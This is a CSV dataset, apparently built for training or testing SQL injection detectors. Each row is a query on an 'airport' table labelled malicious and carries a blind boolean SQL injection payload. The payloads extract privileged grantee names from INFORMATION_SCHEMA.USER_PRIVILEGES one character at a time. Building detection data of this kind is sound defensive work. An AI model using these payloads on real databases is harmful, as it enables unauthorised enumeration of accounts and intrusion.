full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),19,1))>103-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>96-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),20,1))>112-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>96-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>112-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>120-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>112-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>120-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),17,1))>98-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),20,1))>104-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),20,1))>108-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>116-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),20,1))>110-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>116-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),20,1))>111-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),17,1))>97-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>114-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>96-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),22,1))>115-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>114-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),21,1))>115-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>48-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>24-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>36-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>42-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>39-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>37-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 2,1) AS sgue),23,1))>38-- qeXA"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>51-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>49-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>51-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>54-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>56-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>55-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>51-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(CHAR_LENGTH(grantee) AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>9-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>64-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>120-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>32-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>104-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>116-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>108-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>110-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),3,1))>111-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>110-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),4,1))>111-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>40-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>114-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>36-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>38-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>112-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),1,1))>39-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>120-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),2,1))>113-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>116-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),7,1))>72-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),8,1))>48-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>24-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>114-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),5,1))>115-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>36-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),9,1))>96-- VmRb"";",1,airport-S1,Unknown,Unknown
"SELECT * FROM airport WHERE icao_code = ""AGBT"" OR NOT ORD(MID((SELECT IFNULL(CAST(grantee AS NCHAR),0x20) FROM (SELECT DISTINCT(grantee) FROM INFORMATION_SCHEMA.USER_PRIVILEGES LIMIT 3,1) AS aqis),6,1))>42-- VmRb"";",1,airport-S1,Unknown,Unknown
